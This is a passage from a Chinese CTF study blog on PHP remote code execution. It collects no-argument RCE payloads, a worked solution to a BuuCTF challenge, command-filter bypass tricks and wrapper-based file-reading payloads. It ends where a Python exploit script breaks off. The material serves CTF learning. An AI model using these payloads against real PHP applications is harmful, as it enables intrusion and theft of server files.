<h3 id="方法4：get-defined-vars"><a href="#方法4：get-defined-vars" class="headerlink" title="方法4：get_defined_vars()"></a>方法4：get_defined_vars()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars() 函数返回由所有已定义变量所组成的数组。</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>和getallheaders()利用类似，但是不止apache, ngnix和其他的也可以用</p>
<h5 id="利用-GET"><a href="#利用-GET" class="headerlink" title="利用$_GET"></a>利用<code>$_GET</code></h5><p>url：<a target="_blank" rel="noopener" href="http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()">http://127.0.0.1/ctf/boringcode/rce.php?test=phpinfo()</a>;</p>
<p>post：<code>code=eval(end(current(get_defined_vars())));</code></p>
<h3 id="方法5：直接遍历目录"><a href="#方法5：直接遍历目录" class="headerlink" title="方法5：直接遍历目录"></a>方法5：直接遍历目录</h3><p>可以尝试直接读取本地文件 , 其中最大的问题就是如何切换目录来遍历目录 .</p>
<p><strong>getcwd() : 获取当前工作目录</strong></p>
<p><strong>scandir() : 查看当前目录下的内容</strong></p>
<p> <strong>dirname() : 跳转上级目录</strong> </p>
<p><strong>readfile() : 读取文件</strong></p>
<h3 id="常用playpoad"><a href="#常用playpoad" class="headerlink" title="常用playpoad"></a>常用playpoad</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">读文件：</span><br><span class="line">readfile(end(scandir(chr(pos(localtime(time(chdir(next(scandir(pos(localeconv())))))))))))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="最后：所有利用到的函数总结"><a href="#最后：所有利用到的函数总结" class="headerlink" title="最后：所有利用到的函数总结"></a>最后：所有利用到的函数总结</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">getcwd() 函数返回当前工作目录。</span><br><span class="line">scandir() 函数返回指定目录中的文件和目录的数组。</span><br><span class="line">dirname() 函数返回路径中的目录部分。</span><br><span class="line">chdir() 函数改变当前的目录。</span><br><span class="line"></span><br><span class="line">readfile()  输出一个文件 </span><br><span class="line"></span><br><span class="line">current()       返回数组中的当前单元, 默认取第一个值</span><br><span class="line">pos()           current() 的别名</span><br><span class="line">next() 函数将内部指针指向数组中的下一个元素，并输出。</span><br><span class="line">end()       将内部指针指向数组中的最后一个元素，并输出。</span><br><span class="line">array_rand()    函数返回数组中的随机键名，或者如果您规定函数返回不只一个键名，则返回包含随机键名的数组。</span><br><span class="line">array_flip()    array_flip() 函数用于反转/交换数组中所有的键名以及它们关联的键值。</span><br></pre></td></tr></table></figure>

<p>other: <strong>array_flip可以替换为array_reverse</strong></p>
<p> <strong>readfile可以替换为show_source 和 highlight_flie</strong></p>
<p>介绍以下相关payload需要的函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">scandir() :将返回当前目录中的所有文件和目录的列表。返回的结果是一个数组，其中包含当前目录下的所有文件和目录名称（glob()可替换）</span><br><span class="line">localeconv() ：返回一包含本地数字及货币格式信息的数组。（但是这里数组第一项就是‘.’，这个.的用处很大）</span><br><span class="line">current() ：返回数组中的单元，默认取第一个值。pos()和current()是同一个东西</span><br><span class="line">getcwd() :取得当前工作目录</span><br><span class="line">dirname():函数返回路径中的目录部分</span><br><span class="line">array_flip() :交换数组中的键和值，成功时返回交换后的数组</span><br><span class="line">array_rand() :从数组中随机取出一个或多个单元</span><br><span class="line">array_reverse():将数组内容反转</span><br><span class="line">strrev():用于反转给定字符串</span><br><span class="line">getcwd()：获取当前工作目录路径</span><br><span class="line">dirname() ：函数返回路径中的目录部分。</span><br><span class="line">chdir() ：函数改变当前的目录。</span><br><span class="line">eval()、assert()：命令执行</span><br><span class="line">hightlight_file()、show_source()、readfile()：读取文件内容</span><br></pre></td></tr></table></figure>

<p>举一个例子关于scandir()函数的使用：</p>
<p>scandir(‘.’)是返回当前目录，就可以靠localeconv() 返回的数组第一个就是‘.’，current()取第一个值，那么current(localeconv())就能构造一个‘.’,那么以下就是一个简单的返回查看当前目录下文件的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?参数=var_dump(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>数组移动操作：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>

<h3 id="方法一：scandir-最常规的通解"><a href="#方法一：scandir-最常规的通解" class="headerlink" title="方法一：scandir() 最常规的通解"></a>方法一：scandir() 最常规的通解</h3><p>一道例题BuuCTF [GXYCTF2019]禁止套娃</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;flag.php&quot;;</span><br><span class="line">echo &quot;flag在哪里呢？&lt;br&gt;&quot;;</span><br><span class="line">if(isset($_GET[&#x27;exp&#x27;]))&#123;</span><br><span class="line">    if (!preg_match(&#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">        if(&#x27;;&#x27; === preg_replace(&#x27;/[a-z,_]+\((?R)?\)/&#x27;, NULL, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">            if (!preg_match(&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;, $_GET[&#x27;exp&#x27;])) &#123;</span><br><span class="line">                // echo $_GET[&#x27;exp&#x27;];</span><br><span class="line">                @eval($_GET[&#x27;exp&#x27;]);</span><br><span class="line">            &#125;</span><br><span class="line">            else&#123;</span><br><span class="line">                die(&quot;还差一点哦！&quot;);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        else&#123;</span><br><span class="line">            die(&quot;再好好想想！&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        die(&quot;还想读flag，臭弟弟！&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">// highlight_file(__FILE__);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>最终的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>

<p>接下来逐个分析payload的构成：</p>
<p>1、var_dump(localeconv());可以看见第一个string[1]就是一个“.”，这个点是由localeconv()产生的</p>
<p>2、利用<code>current()</code>函数将这个点取出来的，<code>‘.’</code>代表的是当前目录，那接下来就很好理解了，我们可以利用这个点完成遍历目录的操作，相当于就是<code>linux</code>中的<code>ls</code>指令</p>
<p>3、既然current()取第一个值，那么current(localeconv())构造一个<code>&#39;.&#39;</code>,<strong>而</strong><code>&#39;.&#39;</code> <strong>表示当前目录</strong>，<code>scandir(&#39;.&#39;)</code> 将返回当前目录中的文件和子目录，这里我们得知flag所在的文件名就是flag.php</p>
<p>4、然而flag的文件名在比较后端我们可以通过array_reverse()将数组内容反转，让它从倒数第二的位置变成正数第二</p>
<p>5、移动指针读取第二个数组，参照下列数组移动操作可知我们应选用next()函数：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">end() ： 将内部指针指向数组中的最后一个元素，并输出</span><br><span class="line">next() ：将内部指针指向数组中的下一个元素，并输出</span><br><span class="line">prev() ：将内部指针指向数组中的上一个元素，并输出</span><br><span class="line">reset() ： 将内部指针指向数组中的第一个元素，并输出</span><br><span class="line">each() ： 返回当前元素的键名和键值，并将内部指针向前移动</span><br></pre></td></tr></table></figure>

<p>6、最后用highlight_file()返回文件内容</p>
<p>使用最多最灵活的一个函数,可以构造出不同用法，这里直接引用了别人的payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">highlight_file(array_rand(array_flip(scandir(getcwd())))); //查看和读取当前目录文件</span><br><span class="line">print_r(scandir(dirname(getcwd()))); //查看上一级目录的文件</span><br><span class="line">print_r(scandir(next(scandir(getcwd()))));  //查看上一级目录的文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd()))))))); //读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));//读取上级目录文件</span><br><span class="line">show_source(array_rand(array_flip(scandir(chr(current(localtime(time(chdir(next(scandir(current(localeconv()))))))))))));//这个得爆破，不然手动要刷新很久，如果文件是正数或倒数第一个第二个最好不过了，直接定位</span><br><span class="line">  //查看和读取根目录文件</span><br><span class="line">  //查看和读取根目录文件</span><br></pre></td></tr></table></figure>

<h3 id="方法二：session-id"><a href="#方法二：session-id" class="headerlink" title="方法二：session_id()"></a>方法二：session_id()</h3><p>使用条件：当请求头中有cookie时（或者走投无路手动添加cookie头也行，有些CTF题不会卡）</p>
<p>首先我们需要开启session_start()来保证session_id()的使用，session_id可以用来获取当前会话ID，也就是说它可以抓取PHPSESSID后面的东西，但是phpsession不允许()出现</p>
<h4 id="法一：hex2bin（）"><a href="#法一：hex2bin（）" class="headerlink" title="法一：hex2bin（）"></a>法一：hex2bin（）</h4><p>我们自己手动对命令进行十六进制编码，后面在用函数hex2bin()解码转回去，使得后端实际接收到的是恶意代码。我们把想要执行的命令进行十六进制编码后，替换掉‘Cookie:PHPSESSID&#x3D;’后面的值</p>
<p>以下是十六进制编码脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$encoded = bin2hex(&quot;phpinfo();&quot;);</span><br><span class="line">echo $encoded;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>得到phpinfo();的十六进制编码，即706870696e666f28293b</p>
<p>那么payload就可以是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?参数=eval(hex2bin(session_id(session_start())));</span><br></pre></td></tr></table></figure>

<h4 id="法二：读文件"><a href="#法二：读文件" class="headerlink" title="法二：读文件"></a>法二：读文件</h4><p>例题依然是[GXYCTF2019]禁止套娃，在知道文件名为flag.php的情况下直接读文件</p>
<p>如果已知文件名，把文件名写在PHPSESSID后面，构造payload为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">readfile(session_id(session_start()));</span><br></pre></td></tr></table></figure>

<h3 id="方法三：getallheaders"><a href="#方法三：getallheaders" class="headerlink" title="方法三：getallheaders()"></a>方法三：getallheaders()</h3><p>getallheaders()返回当前请求的所有请求头信息，局限于Apache（apache_request_headers()和getallheaders()功能相似，可互相替代，不过也是局限于Apache）</p>
<p>当确定能够返回时，我们就能在数据包最后一行加上一个请求头，写入恶意代码，再用end()函数指向最后一个请求头，使其执行，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(end(getallheaders()));</span><br></pre></td></tr></table></figure>

<h3 id="方法四：get-defined-vars"><a href="#方法四：get-defined-vars" class="headerlink" title="方法四：get_defined_vars()"></a>方法四：get_defined_vars()</h3><p>相较于getallheaders（）更加具有普遍性，它可以回显全局变量$_GET、$_POST、$_FILES、$_COOKIE，</p>
<p>返回数组顺序为$_GET–&gt;$_POST–&gt;$_COOKIE–&gt;$_FILES</p>
<p>首先确认是否有回显：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(get_defined_vars());</span><br></pre></td></tr></table></figure>

<p>假如说原本只有一个参数a，那么可以多加一个参数b，后面写入恶意语句，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=eval(end(current(get_defined_vars())));&amp;b=system(&#x27;ls /&#x27;);</span><br></pre></td></tr></table></figure>

<p>把eval换成assert也行 ，能执行system(‘ls &#x2F;‘)就行</p>
<h3 id="方法五：chdir-array-rand-赌狗读文"><a href="#方法五：chdir-array-rand-赌狗读文" class="headerlink" title="方法五：chdir()&amp;array_rand()赌狗读文"></a>方法五：chdir()&amp;array_rand()赌狗读文</h3><p>实在无法rce，可以考虑目录遍历进行文件读取</p>
<p>利用<code>getcwd()</code>获取当前目录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(getcwd());</span><br></pre></td></tr></table></figure>

<p>结合dirname()列出当前工作目录的父目录中的所有文件和目录:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var_dump(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>

<p>读上一级文件名：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(getcwd())))))))))));</span><br><span class="line"></span><br><span class="line">?code=show_source(array_rand(array_flip(scandir(chr(ord(hebrevc(crypt(chdir(next(scandir(chr(ord(hebrevc(crypt(phpversion())))))))))))))));</span><br></pre></td></tr></table></figure>

<p>读根目录:</p>
<p>ord() 函数和 chr() 函数：只能对第一个字符进行转码，ord() 编码，chr)解码，有概率会解码出斜杠读取根目录</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>

<p>要用chdir()固定，payload：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code=show_source(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array() )))))))))));</span><br></pre></td></tr></table></figure>

<p>通过bp的intruder模块来读到根目录：</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>







  
    <article id="post-常用命令" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2025/04/22/%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4/" class="article-date">
  	<time datetime="2025-04-22T13:25:06.959Z" itemprop="datePublished">2025-04-22</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="命令执行常用命令"><a href="#命令执行常用命令" class="headerlink" title="命令执行常用命令"></a>命令执行常用命令</h1><p>[TOC]</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。</span><br><span class="line">我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">more:一页一页的显示档案内容</span><br><span class="line">less:与 more 类似</span><br><span class="line">head:查看头几行</span><br><span class="line">tac:从最后一行开始显示，可以看出 tac 是 cat 的反向显示</span><br><span class="line">tail:查看尾几行</span><br><span class="line">nl：显示的时候，顺便输出行号</span><br><span class="line">od:以二进制的方式读取档案内容</span><br><span class="line">vi:一种编辑器，这个也可以查看</span><br><span class="line">vim:一种编辑器，这个也可以查看</span><br><span class="line">sort:可以查看</span><br><span class="line">uniq:可以查看</span><br><span class="line">file -f:报错出具体内容</span><br><span class="line">grep</span><br><span class="line">1、在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令：</span><br><span class="line">grep test *file</span><br><span class="line">strings</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">空格替代：%09   $IFS   $&#123;IFS&#125;   &lt;&gt;   &lt;</span><br><span class="line"></span><br><span class="line">字符串匹配干扰：‘’（两个单引号）    %0a(换行)     $@    \</span><br><span class="line"></span><br><span class="line">通配符：* ?</span><br></pre></td></tr></table></figure>

<p>读取目录的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">读取目录的方法总结：</span><br><span class="line">var_dump(scandir(&quot;/&quot;));</span><br><span class="line">print_r(glob(&quot;*&quot;)); // 列当前目录</span><br><span class="line">print_r(glob(&quot;/*&quot;)); // 列根目录</span><br><span class="line">print_r(scandir(&quot;.&quot;));</span><br><span class="line">print_r(scandir(&quot;/&quot;));</span><br><span class="line">$d=opendir(&quot;.&quot;);while(false!==($f=readdir($d)))&#123;echo&quot;$f\n&quot;;&#125;</span><br><span class="line">$d=dir(&quot;.&quot;);while(false!==($f=$d-&gt;read()))&#123;echo$f.&quot;\n&quot;;&#125;</span><br><span class="line">$a=glob(&quot;/*&quot;);foreach($a as $value)&#123;echo $value.&quot;   &quot;;&#125;</span><br><span class="line">$a=new DirectoryIterator(&#x27;glob:///*&#x27;);foreach($a as $f)&#123;echo($f-&gt;__toString().&quot; &quot;);&#125;</span><br></pre></td></tr></table></figure>

<p>读取文件的方法：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">读取文件的函数总结：</span><br><span class="line">c=foreach(glob(&quot;/fl*&quot;)as$f)&#123;readfile($f);&#125; //glob() 遍历匹配文件</span><br><span class="line">highlight_file($filename);</span><br><span class="line">show_source($filename);</span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line">print_r(file($filename)); // var_dump</span><br><span class="line">fread(fopen($filename,&quot;r&quot;), $size);</span><br><span class="line">include($filename); // 非php代码</span><br><span class="line">include_once($filename); // 非php代码</span><br><span class="line">require($filename); // 非php代码</span><br><span class="line">require_once($filename); // 非php代码</span><br><span class="line">print_r(fread(popen(&quot;cat flag&quot;, &quot;r&quot;), $size));</span><br><span class="line">print_r(fgets(fopen($filename, &quot;r&quot;))); // 读取一行</span><br><span class="line">fpassthru(fopen($filename, &quot;r&quot;)); // 从当前位置一直读取到 EOF</span><br><span class="line">print_r(fgetcsv(fopen($filename,&quot;r&quot;), $size));</span><br><span class="line">print_r(fgetss(fopen($filename, &quot;r&quot;))); // 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="line">print_r(fscanf(fopen(&quot;flag&quot;, &quot;r&quot;),&quot;%s&quot;));</span><br><span class="line">print_r(parse_ini_file($filename)); // 失败时返回 false , 成功返回配置数组</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=include$_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c=include%_POST[a]?&gt;</span><br><span class="line">postdata: a=php://filter/read=convert.base64-encode/resource=flag.php</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?=system(&quot;tac fla*&quot;);?&gt;</span><br></pre></td></tr></table></figure>

<p>mysql的load_file进行读取文件，payload如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">c=try &#123;$dbh = new PDO(&#x27;mysql:host=localhost;dbname=ctftraining&#x27;, &#x27;root&#x27;,</span><br><span class="line">&#x27;root&#x27;);foreach($dbh-&gt;query(&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;) as $row)</span><br><span class="line">&#123;echo($row[0]).&quot;|&quot;; &#125;$dbh = null;&#125;catch (PDOException $e) &#123;echo $e-</span><br><span class="line">&gt;getMessage();exit(0);&#125;exit(0);</span><br></pre></td></tr></table></figure>

<p>利用FF1拓展(php7.4开始才有)，payload如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=?&gt;&lt;?php $ffi = FFI::cdef(&quot;int system(const char *command);&quot;);$ffi-&gt;system(&quot;/readflag &gt;flag.txt&quot;);exit();</span><br></pre></td></tr></table></figure>

<h3 id="一些特殊的方法："><a href="#一些特殊的方法：" class="headerlink" title="一些特殊的方法："></a>一些特殊的方法：</h3><h3 id="无参数RCE读取文件："><a href="#无参数RCE读取文件：" class="headerlink" title="无参数RCE读取文件："></a>无参数RCE读取文件：</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">题目：</span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123;</span><br><span class="line">    $c = $_GET[&#x27;c&#x27;];</span><br><span class="line">    if(!preg_match(&quot;/[0-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;|\/|\?|\\\\/i&quot;, $c))&#123;</span><br><span class="line">        eval($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(‘.’)); 查看当前目录下的所有文件名</span><br><span class="line"></span><br><span class="line">localeconv() 函数返回一包含本地数字及货币格式信息的数组。</span><br><span class="line"></span><br><span class="line">current() 函数返回数组中的当前元素（单元）,默认取第一个值，pos是current的别名</span><br><span class="line"></span><br><span class="line">?c=print_r(scandir(current(localeconv())));</span><br></pre></td></tr></table></figure>

<p>读取目录文件后，发现输出的是数组，而文件名是数组中的值，下一步我们需要取出想要读取文件的数组</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">each() 返回数组中当前的键/值对并将数组指针向前移动一步</span><br><span class="line">end() 将数组的内部指针指向最后一个单元</span><br><span class="line">next() 将数组中的内部指针向前移动一位</span><br><span class="line">prev() 将数组中的内部指针倒回一位</span><br><span class="line">array_reverse() 以相反的元素顺序返回数组 getcwd() 函数返回当前工作目录。 show_source() 函数对文件进行语法高亮显示。该函数是 highlight_file()的别名</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=show_source(next(array_reverse(scandir(getcwd()))));</span><br></pre></td></tr></table></figure>

<h3 id="无数字，字母实现RCE读取文件方法一："><a href="#无数字，字母实现RCE读取文件方法一：" class="headerlink" title="无数字，字母实现RCE读取文件方法一："></a>无数字，字母实现RCE读取文件方法一：</h3><p>利用或运算得到需要的字符然后拼接成命令执行</p>
<p>或运算脚本：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import urllib</span><br><span class="line">import re</span><br><span class="line">from sys import *</span><br><span class="line">if(len(argv)!=2):</span><br><span class="line">    print(&quot;=&quot;*50)</span><br><span class="line">    print(&#x27;USER:python exp.py &lt;url&gt;&#x27;)</span><br><span class="line">    print(&quot;eg:  python exp.py http://ctf.show/&quot;)</span><br><span class="line">    print(&quot;exit: input exit in function&quot;)</span><br><span class="line">    print(&quot;=&quot;*50)</span><br><span class="line">    exit(0)</span><br><span class="line">url=argv[1]</span><br><span class="line"></span><br><span class="line">#生成可用的字符</span><br><span class="line">def write_rce():</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    preg = 